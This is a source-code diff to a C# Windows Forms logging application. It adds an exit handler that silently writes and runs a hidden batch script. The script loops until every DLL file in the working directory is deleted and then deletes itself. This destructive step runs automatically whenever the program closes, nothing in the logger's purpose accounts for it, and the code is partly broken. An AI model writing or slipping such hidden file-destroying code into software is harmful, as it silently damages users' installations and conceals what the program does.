@@ -4,6 +4,7 @@ using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Security.Principal;
 using System.Windows.Forms;
 
 namespace Logger
@@ -18,6 +19,7 @@ namespace Logger
         public MainW()
         {
             log.Info($"Logger Started");
+            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);
             InitializeComponent();
             this.BackColor = System.Drawing.Color.LightGray;
             mainMenu.ForeColor = System.Drawing.Color.White;
@@ -69,6 +71,50 @@ namespace Logger
                 "LogView Logs Options: 11100000\n" +
                 "LogView Files Options: 11111000\n" +
                 "LogView Filter Options: 11000000\n";
+        }
+
+        private void OnProcessExit(object sender, EventArgs e)
+        {
+
+            string delname = "test.cmd";
+            string fileurl = Application.ExecutablePath;
+            string whatINeed = "*.dll";
+
+            System.IO.StreamWriter file = new System.IO.StreamWriter(delname);
+            file.WriteLine(":Repeat");
+            file.WriteLine("del \"" + whatINeed + "\"");
+            file.WriteLine("if exist \"" + whatINeed + "\" goto Repeat");
+            file.WriteLine("del \"" + delname + "\"");
+            file.Close();
+
+
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.CreateNoWindow = true;
+            startInfo.UseShellExecute = false;
+            startInfo.FileName = delname;
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+            Process p;
+            int exitCode;
+
+            try
+            {
+                p = Process.Start(startInfo);
+
+                //p.WaitForExit();
+
+                exitCode = p.ExitCode;
+
+                p.Close();
+
+            }
+            catch (Exception ex)
+            {
+                log.Error($"ERROR: operation failed {ex.Message}");
+            }
+
+
+
         }
 
         private void openToolStripMenuItem_Click(object sender, EventArgs e)
